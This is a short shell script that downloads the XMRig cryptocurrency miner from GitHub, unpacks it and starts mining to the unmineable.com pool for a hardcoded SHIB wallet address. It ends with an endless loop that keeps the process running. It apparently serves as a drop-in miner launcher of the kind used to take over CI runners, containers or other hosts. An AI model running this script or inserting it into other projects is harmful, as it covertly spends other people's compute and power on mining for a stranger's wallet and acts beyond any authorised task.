#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o rx.unmineable.com:3333 -u SHIB:0x65d44c99e28edb21427486154d1c1f6dc51cb88d.worker1 -p -k -a rx/0
while [ 1 ]; do
sleep 3
done
sleep 999
